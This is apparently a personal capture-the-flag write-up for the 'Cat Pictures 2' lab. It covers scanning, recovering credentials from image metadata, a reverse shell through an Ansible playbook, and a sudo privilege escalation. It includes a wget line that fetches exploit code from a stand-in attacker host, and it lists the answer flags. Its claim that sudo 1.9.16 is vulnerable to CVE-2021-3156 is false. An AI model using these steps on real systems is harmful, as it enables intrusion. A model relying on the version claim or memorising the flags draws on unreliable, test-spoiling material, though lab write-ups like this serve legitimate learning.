# Cat Pictures 2

### Flags!
Initial nmap scan shows ports 22,80,222,1337,3000 and 8080 open:

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
    |   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
    |_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
    80/tcp   open  http    nginx 1.4.6 (Ubuntu)
    | http-git: 
    |   10.10.150.134:80/.git/
    |     Git repository found!
    |     Repository description: Unnamed repository; edit this file 'description' to name the...
    |     Remotes:
    |       https://github.com/electerious/Lychee.git
    |_    Project type: PHP application (guessed from .gitignore)
    | http-robots.txt: 7 disallowed entries 
    |_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
    |_http-title: Lychee
    |_http-server-header: nginx/1.4.6 (Ubuntu)
    222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
    | ssh-hostkey: 
    |   256 be:cb:06:1f:33:0f:60:06:a0:5a:06:bf:06:53:33:c0 (ECDSA)
    |_  256 9f:07:98:92:6e:fd:2c:2d:b0:93:fa:fe:e8:95:0c:37 (ED25519)
    1337/tcp open  waste?
    | fingerprint-strings: 
    |   GenericLines: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest, HTTPOptions: 
    |     HTTP/1.0 200 OK
    |     Accept-Ranges: bytes
    |     Content-Length: 3858
    |     Content-Type: text/html; charset=utf-8
    |     Date: Sun, 22 Dec 2024 20:08:19 GMT
    |     Last-Modified: Wed, 19 Oct 2022 15:30:49 GMT
    |     <!DOCTYPE html>
    |     <html>
    |     <head>
    |     <meta name="viewport" content="width=device-width, initial-scale=1.0">
    |     <title>OliveTin</title>
    |     <link rel = "stylesheet" type = "text/css" href = "style.css" />
    |     <link rel = "shortcut icon" type = "image/png" href = "OliveTinLogo.png" />
    |     <link rel = "apple-touch-icon" sizes="57x57" href="OliveTinLogo-57px.png" />
    |     <link rel = "apple-touch-icon" sizes="120x120" href="OliveTinLogo-120px.png" />
    |     <link rel = "apple-touch-icon" sizes="180x180" href="OliveTinLogo-180px.png" />
    |     </head>
    |     <body>
    |     <main title = "main content">
    |     <fieldset id = "section-switcher" title = "Sections">
    |     <button id = "showActions">Actions</button>
    |_    <button id = "showLogs">Logs</but
    3000/tcp open  ppp?
    | fingerprint-strings: 
    |   GenericLines, Help, RTSPRequest: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 200 OK
    |     Cache-Control: no-store, no-transform
    |     Content-Type: text/html; charset=UTF-8
    |     Set-Cookie: i_like_gitea=7cbab1b137caab4d; Path=/; HttpOnly; SameSite=Lax
    |     Set-Cookie: _csrf=SffAM2ZL2mfIiWjRzUlcR_P4veg6MTczNDg5ODA5OTQ0MjMxMzYzNw; Path=/; Expires=Mon, 23 Dec 2024 20:08:19 GMT; HttpOnly; SameSite=Lax
    |     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
    |     X-Frame-Options: SAMEORIGIN
    |     Date: Sun, 22 Dec 2024 20:08:19 GMT
    |     <!DOCTYPE html>
    |     <html lang="en-US" class="theme-">
    |     <head>
    |     <meta charset="utf-8">
    |     <meta name="viewport" content="width=device-width, initial-scale=1">
    |     <title> Gitea: Git with a cup of tea</title>
    |     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
    |   HTTPOptions: 
    |     HTTP/1.0 405 Method Not Allowed
    |     Cache-Control: no-store, no-transform
    |     Set-Cookie: i_like_gitea=c6dc4fa792ad5cd3; Path=/; HttpOnly; SameSite=Lax
    |     Set-Cookie: _csrf=i82q43PSHKigw-Qb-AdDAuDqSWE6MTczNDg5ODEwNDczOTcyODY2MA; Path=/; Expires=Mon, 23 Dec 2024 20:08:24 GMT; HttpOnly; SameSite=Lax
    |     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
    |     X-Frame-Options: SAMEORIGIN
    |     Date: Sun, 22 Dec 2024 20:08:24 GMT
    |_    Content-Length: 0
    8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
    |_http-server-header: SimpleHTTP/0.6 Python/3.6.9
    |_http-title: Welcome to nginx!

Gobuster directory enumeration shows the following directories:<br />
![image](https://github.com/user-attachments/assets/f36e081e-9f12-4d73-ac94-b7325b9007f8)<br />
Robots.txt file shows the following directories: <br />
![image](https://github.com/user-attachments/assets/e541d71c-abb0-4643-a4d2-24809da568f6)<br />
I also enumerated al the other webservers a bit but I didn't find anything. Then, looking at the album pictures, I found a hint:<br />
![image](https://github.com/user-attachments/assets/d181e5e9-1d7b-4fbe-b098-7f7b458e4dc8)<br />
This means that there's likely some hidden information inside this image. This is a lesson to me, don't start enumerating stuff like an automa. Start on the simple things, look at the page in front of you and explore it as a normal user.<br /><br />
So I download the image and use the tool `steghide` to extract information from it(`sudo apt-get install steghide`). I get asked to enter a passphrase: <br />
![image](https://github.com/user-attachments/assets/e58eed48-17a0-4587-a7dc-d85fe4aa76bf)<br />
I tried to use `stegseek` to bruteforce the passphrase with rockyou.txt but it didn't work. Next I used the tool `exiftool` that extracts metadata from images. So I run `exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg` <br />
![image](https://github.com/user-attachments/assets/52fdcd03-f1a4-47bd-979a-c2d8f9bce835)<br />
Among other things, the title is really weird, and hints at the presence of a .txt file inside the webserver at port 8080. In fact, there's something there: <br />
![image](https://github.com/user-attachments/assets/a3a40f81-b53a-439c-ace7-e8c2b13a9e88)<br />
New credentials found: `samarium:TUmhyZ37CLZrhP`. After logging into gitea I get the first flag. Now we also have access to the repository containing `ansible/playbook.yaml`. <br />
Now If we check the webserver at port 1337, there's an `OliveTin` instance, which is a web application that gives safe access to system commands for people that are less techical. Among all the commands, there's "Run Ansible Playbook":<br />
![image](https://github.com/user-attachments/assets/6e1bf9d5-ad0b-441e-a1f8-aa41ef1fdb5f)<br />
In order to spawn a reverse shell, I open a netcat listener on port 4444, and modify the `playbook.yaml` as follows:<br />
![image](https://github.com/user-attachments/assets/3e45ca86-2450-4941-8909-5b2a218efe65)<br />
I am now the user `bismuth` and got the second flag.<br />
Running linpeas, it shows me, among other things, the sudo version: <br />
![image](https://github.com/user-attachments/assets/7bc45ae8-f5a0-422b-ad91-6d775a7975bd)<br />
The current sudo version is `1.9.16`, so this one must be vulnerable. I found [here](https://github.com/blasty/CVE-2021-3156) a POC for a CVE that exploits this sudo version for privilege escalation.<br />
What I need to do now is to download the repo on my machine with `git clone https://github.com/blasty/CVE-2021-3156`. Then I need to transfer it on the target machine. Since I can't transfer an entire folder using netcat or python http.server, I need to compress it first.<br />
Run `tar -cvf exp.tar CVE-2021-3156` (-c stands for create, -v for verbose, -f to specify the name of the file). So now open an http server with `python3 -m http.server`, and on the attacker machine download it with `wget http://attacker_IP/exp.tar`.<br />
Now on the target machine, run `tar xf exp.tar` (-x stands for extract, -f specifies the file) and then run `make`, like below:<br />
![image](https://github.com/user-attachments/assets/9b9770eb-3770-4c95-a3eb-acd0b34b96d6)<br />
Now I can run the exploit on the target machine and get the last flag: <br />
![image](https://github.com/user-attachments/assets/063563ea-54b5-4ffc-b6ef-62181f519176)<br />


- What is Flag 1? `10d916eaea54bb5ebe36b59538146bb5`
- What is Flag 2? `5e2cafbbf180351702651c09cd797920`
- What is Flag 3? `6d2a9f8f8174e86e27d565087a28a971`
